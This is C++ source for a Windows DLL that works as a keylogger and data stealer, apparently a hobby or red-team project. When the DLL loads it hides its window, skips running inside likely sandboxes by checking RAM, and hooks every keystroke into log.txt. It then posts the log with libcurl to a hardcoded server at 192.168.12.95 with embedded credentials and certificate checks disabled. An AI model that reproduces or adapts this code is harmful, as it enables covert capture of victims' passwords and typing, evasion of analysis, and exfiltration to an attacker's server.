// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <curl/curl.h>
#include "keylogger.h"
#define KEYLOG_FILE "log.txt"
#define DEBUG 1
#define MAX_CLICKS 10
#define MAX_TIMEOUT (15 * 60 * 1000)  // 15 minutes in milliseconds
#define MINIMUM_RAM 7.0 // in GB


// Prototypes
WINHTTP_STATUS_CALLBACK WinhttpStatusCallback;
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
char determineCharGivenVkCode(DWORD vkCode);
void cleanup();
VOID Fatal(LPCSTR s);
int logger();
BOOL notEnoughRAM();
BOOL detectSandbox();
DWORD WINAPI SendLog(LPVOID lpParam);
DWORD WINAPI PrintThreadFunction(LPVOID lpParam);
int sendHTTPRequest();
int programStart();

	int clickCount = 0;
	int timedOut = 0;

void printStuff()
{
    MessageBoxA(NULL,
        "Nathan is so good at programming!",
        "Nathan's Textbox",
        MB_ICONERROR | MB_OK);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		//printStuff();
		sendHTTPRequest();
		//programStart();
		break;
    }
	//SendLog(NULL);
	programStart();
    return TRUE;
}


int programStart() {
	DWORD err;
	HWND hwnd = GetConsoleWindow();
	LPCSTR MutexName = "secret";

	ShowWindow(hwnd, SW_HIDE); // hide the window.
	ghMutex = CreateMutexA(NULL, TRUE, MutexName);
	err = GetLastError();
	if (ghMutex == NULL)
	{
		// mutex creation fails.
		printf("%d", err);
		Fatal("Mutex could not be created\n");
		return -1;
	}
	if (err == ERROR_ALREADY_EXISTS)
	{
		//Mutex exists
		Fatal("Mutex already exists\n");
	}
	 //Sandbox detection
	if (detectSandbox()) {
		exit(1);
	}
	logger();
	return 1;
}
	

int logger(){
	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, 0);
	HANDLE hThread;
	DWORD dwThreadId;

	//hThread = CreateThread(NULL, 0, PrintThreadFunction, NULL, 0, &dwThreadId);
	//if (hThread == NULL)
	//{
	//	Fatal("Thread error");
	//	exit(1);
	//}
	//CloseHandle(hThread);
	// This GetMessage() loop is used to prevent the application from closing.
	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// error handling
			return -1;
		}
		else {
			TranslateMessage(&msg);
			DispatchMessageW(&msg);
		}
	}
	return 1;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
			DWORD vkCode = kbd->vkCode;
			int ret = 0;
			char charFromKeyboard;
			if (vkCode >= 0x01 && vkCode <= 0x5A){
				// for all characters
				// i dont think we need this if statement anymore...
				FILE* fp;
				ret = fopen_s(&fp,KEYLOG_FILE, "a");
				if (fp == NULL)
				{
					perror("Error opening log");
					exit(-1);
				}
				//check ret value
				charFromKeyboard = determineCharGivenVkCode(vkCode);
				if (charFromKeyboard == VK_BACK)
				{
					fputs("[BCKSPC]", fp);
				}
				else if (charFromKeyboard == NULL)
				{
					
				}
				else {

				fputc(charFromKeyboard, fp);
				}
				fclose(fp);
			}
		} 
	}
	return (CallNextHookEx(NULL, nCode, wParam, lParam));
}

char determineCharGivenVkCode(DWORD vkCode){
	if (GetAsyncKeyState(VK_SHIFT))
	{
		//if the shift key is getting pressed, we return this set of characters
		switch (vkCode)
		{
		case VK_RETURN:
			return '\n';
		case VK_SPACE:
			return 0x20;
		case 0x30:
			return ')';
		case 0x31:
			return '!';
		case 0x32:
			return '@';
		case 0x33:
			return '#';
		case 0x34:
			return '$';
		case 0x35:
			return '%';
		case 0x36:
			return '^';
		case 0x37:
			return '&';
		case 0x38:
			return '*';
		case 0x39:
			return '(';
		case 0x41:
			return 'A';
		case 0x42:
			return 'B';
		case 0x43:
			return 'C';
		case 0x44:
			return 'D';
		case 0x45:
			return 'E';
		case 0x46:
			return 'F';
		case 0x47:
			return 'G';
		case 0x48:
			return 'H';
		case 0x49:
			return 'I';
		case 0x4A:
			return 'J';
		case 0x4B:
			return 'K';
		case 0x4C:
			return 'L';
		case 0x4D:
			return 'M';
		case 0x4E:
			return 'N';
		case 0x4F:
			return 'O';
		case 0x50:
			return 'P';
		case 0x51:
			return 'Q';
		case 0x52:
			return 'R';
		case 0x53:
			return 'S';
		case 0x54:
			return 'T';
		case 0x55:
			return 'U';
		case 0x56:
			return 'V';
		case 0x57:
			return 'W';
		case 0x58:
			return 'X';
		case 0x59:
			return 'Y';
		case 0x60:
			return 'Z';
		case VK_OEM_1:
			return ':';
		case VK_OEM_PLUS:
			return '+';
		case VK_OEM_COMMA:
			return '<';
		case VK_OEM_MINUS:
			return '_';
		case VK_OEM_PERIOD:
			return '>';
		case VK_OEM_2:
			return '?';
		case VK_OEM_3:
			return '~';
		case VK_OEM_4:
			return '{';
		case VK_OEM_5:
			return '|';
		case VK_OEM_6:
			return '}';
		case VK_OEM_7:
			return '"';
		case VK_BACK:
			return VK_BACK;
		}


	}
	else
	{
		//if the shift key is NOT getting pressed, we return a different set of characters
		switch (vkCode)
		{
		case VK_RETURN:
			return '\n';
		case VK_SPACE:
			return 0x20;
		case 0x30:
			return '0';
		case 0x31:
			return '1';
		case 0x32:
			return '2';
		case 0x33:
			return '3';
		case 0x34:
			return '4';
		case 0x35:
			return '5';
		case 0x36:
			return '6';
		case 0x37:
			return '7';
		case 0x38:
			return '8';
		case 0x39:
			return '9';
		case 0x41:
			return 'a';
		case 0x42:
			return 'b';
		case 0x43:
			return 'c';
		case 0x44:
			return 'd';
		case 0x45:
			return 'e';
		case 0x46:
			return 'f';
		case 0x47:
			return 'g';
		case 0x48:
			return 'h';
		case 0x49:
			return 'i';
		case 0x4A:
			return 'j';
		case 0x4B:
			return 'k';
		case 0x4C:
			return 'l';
		case 0x4D:
			return 'm';
		case 0x4E:
			return 'n';
		case 0x4F:
			return 'o';
                //PostQuitMessage(0); // replace this with calling the logger function
		case 0x50:
			return 'p';
		case 0x51:
			return 'q';
		case 0x52:
			return 'r';
		case 0x53:
			return 's';
		case 0x54:
			return 't';
		case 0x55:
			return 'u';
		case 0x56:
			return 'v';
		case 0x57:
			return 'w';
		case 0x58:
			return 'x';
		case 0x59:
			return 'y';
		case 0x60:
			return 'z';
		case VK_OEM_1:
			return ';';
		case VK_OEM_PLUS:
			return '=';
		case VK_OEM_COMMA:
			return ',';
		case VK_OEM_MINUS:
			return '-';
		case VK_OEM_PERIOD:
			return '.';
		case VK_OEM_2:
			return '/';
		case VK_OEM_3:
			return '`';
		case VK_OEM_4:
			return '[';
		case VK_OEM_5:
			return '\\';
		case VK_OEM_6:
			return ']';
		case VK_OEM_7:
			return '\'';
		case VK_BACK:
			return VK_BACK;
		}


	}
	return NULL;

}

void cleanup()
{
	CloseHandle(ghMutex);
}

VOID Fatal(LPCSTR s) {
    char err_buf[1000];

    snprintf(err_buf,sizeof(err_buf), "%s failed: %lu", s, GetLastError());
    MessageBoxA(NULL, err_buf, "msgbox", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
	//CloseHandle(ghMutex);
    //ExitProcess(1);
}


BOOL detectSandbox()
{
	BOOL sandboxDetected = false;

	if (notEnoughRAM())
	{
		sandboxDetected = true;
	}

	return sandboxDetected;
}

BOOL notEnoughRAM() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        // Total physical memory in bytes
        ULONGLONG totalPhysicalMemory = memoryStatus.ullTotalPhys;

        // Convert to gigabytes
        double totalPhysicalMemoryGB = (double)totalPhysicalMemory / (double)(1024 * 1024 * 1024);

        // Check if there are at least 7 GB of RAM
		// Most modern enterprise targets should have at least ~8 GB RAM
		// if it has less, then it is probably a sandbox
        if (totalPhysicalMemoryGB >= 7.0) {
            return false;
        }
    }

    return true;
}

int sendHTTPRequest()
{
	CURL* curlHandle = curl_easy_init(); // create the curl handle
	if (curlHandle) {
		CURLcode res;
		FILE* fileHandle;
		int err = 0;

		curl_easy_setopt(curlHandle, CURLOPT_URL, "https://192.168.12.95:8080/file.txt");
		curl_easy_setopt(curlHandle, CURLOPT_USERPWD, "mayuri:tuturu");
		// allow self signed certs
		curl_easy_setopt(curlHandle, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curlHandle, CURLOPT_SSL_VERIFYHOST, 0L);

		curl_easy_setopt(curlHandle, CURLOPT_POST, 1);

		// Read the file contents into a buffer
		FILE* file;
		err = fopen_s(&file, "log.txt", "rb");
		if (err != 0)
		{
			printf("file read issue\n");
			return -1;
		}

		if (file) {
			fseek(file, 0, SEEK_END);
			long file_size = ftell(file);
			rewind(file);
			char* file_contents = (char*)malloc(file_size + 1);
			if (file_contents) {
				fread(file_contents, 1, file_size, file);
				file_contents[file_size] = '\0';

				// Set the file contents as the data to be posted
				curl_easy_setopt(curlHandle, CURLOPT_POSTFIELDS, file_contents);
				res = curl_easy_perform(curlHandle);
				if (res != CURLE_OK && res != CURLE_RECV_ERROR) {
					fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
				}
				curl_easy_cleanup(curlHandle);
			}
			curl_global_cleanup(); //cleanup libcurl
			fclose(file);
			//	LPCWSTR hostname = L"192.168.12.95";
			//	INTERNET_PORT port = 8080;
			//    LPCWSTR username = L"mayuri";
			//    LPCWSTR password = L"tuturu";
			//    LPCWSTR headers = L"Authorization: Basic bWF5dXJpOnR1dHVydQ==\r\nContent-Type: multipart/form-data\r\n";
			//	BOOL  bResults = FALSE;
			//    HINTERNET hSession = NULL,
			//              hConnect = NULL,
			//              hRequest = NULL;
			//
			//    // Use WinHttpOpen to obtain a session handle.
			//    hSession = WinHttpOpen(  NULL, 
			//                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			//                             WINHTTP_NO_PROXY_NAME, 
			//                             WINHTTP_NO_PROXY_BYPASS, 0);
			//
			//    // Specify an HTTP server.
			//    if (hSession)
			//        hConnect = WinHttpConnect( hSession, hostname,
			//                                   port, 0);
			//
			//    // Create an HTTP Request handle.
			//    if (hConnect)
			//        hRequest = WinHttpOpenRequest( hConnect, L"POST", 
			//                                       L"/file.txt", 
			//                                       NULL, WINHTTP_NO_REFERER, 
			//                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
			//                                       WINHTTP_FLAG_SECURE);
			//
			//
			//    // Set the headers
			//      if( hRequest )
			//		bResults = WinHttpAddRequestHeaders( hRequest, headers,
			//                                             (ULONG) -1L,
			//                                             WINHTTP_ADDREQ_FLAG_ADD );
			//
			//      //open the log file for reading
			//      FILE* file;
			//      errno_t err;
			//
			//      err = fopen_s(&file,"log.txt", "rb");
			//
			//      if (file == NULL)
			//      {
			//          WinHttpCloseHandle(hConnect);
			//          WinHttpCloseHandle(hSession); 
			//		  Fatal("WinHttpError");
			//		  exit(1);
			//      }
			//
			//      // get the size of the file
			//      fseek(file, 0, SEEK_END);
			//      long fileSize = ftell(file);
			//      fseek(file, 0, SEEK_SET);
			//
			//      // allocate memory for the file
			//      char* fileBuffer = (char*)malloc(fileSize);
			//
			//      // handle memory allocation error
			//      if (!fileBuffer) {
			//          WinHttpCloseHandle(hConnect);
			//          WinHttpCloseHandle(hSession);
			//          return -1;
			//      }
			//
			//      fread(fileBuffer, 1, fileSize, file);
			//      fclose(file);
			//
			//      /*
			//      * In order to successfully establish a connection with a self signed cert, we need to
			//      * fail the first request, and then, retry the connection. Upon retrying the connection, we can
			//      * connect
			//      */
			//
			//	BOOL retry = false;
			//	DWORD result = NO_ERROR;
			//    do
			//    {
			//		// Send a Request.
			//        if (hRequest)
			//        {
			//            bResults = WinHttpSendRequest(hRequest,
			//                WINHTTP_NO_ADDITIONAL_HEADERS,
			//                0, fileBuffer, fileSize,
			//                fileSize, 0);
			//        if (bResults == false)
			//        {
			//            result = GetLastError();
			//
			//            if (result == ERROR_WINHTTP_SECURE_FAILURE)
			//            {
			//				DWORD dwFlags =
			//					SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			//					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
			//					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			//					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
			//
			//                if (WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
			//                {
			//                    retry = true;
			//                }
			//
			//            }
			//            else if (result == ERROR_WINHTTP_RESEND_REQUEST)
			//            {
			//                retry = true;
			//            }
			//        }
			//        else
			//        {
			//            retry = false;
			//        }
			//        }
			//    } while (retry);
			//
			//    // Report any errors. If we do not get a response
			//	if (!bResults)
			//	{
			//		char formattedError[50];
			//        //printf("WinHTTP Error %d has occurred.\n", GetLastError());
			//		sprintf(formattedError, "%d", GetLastError());
			//		Fatal(formattedError);
			//		return -1;
			//	}
			//
			//    // Close any open handles.
			//    if (hRequest) WinHttpCloseHandle(hRequest);
			//    if (hConnect) WinHttpCloseHandle(hConnect);
			//    if (hSession) WinHttpCloseHandle(hSession);
			//    free(fileBuffer);
			//    //printf("Request Sent Successfully");
			//	return 0;
		}
	}
	return 1;
}

//DWORD WINAPI PrintThreadFunction(LPVOID lpParam)
//{
//    while (1)
//    {
//    MessageBoxA(NULL,
//        "Thread is running!",
//        "Nathan's Textbox",
//        MB_ICONERROR | MB_OK);
//        Sleep(5000);
//    }
//}
//
//DWORD WINAPI SendLog(LPVOID lpParam)
//{
//    while (1)
//    {
//        Sleep(5000);
//        sendHTTPRequest();
//    }
//}
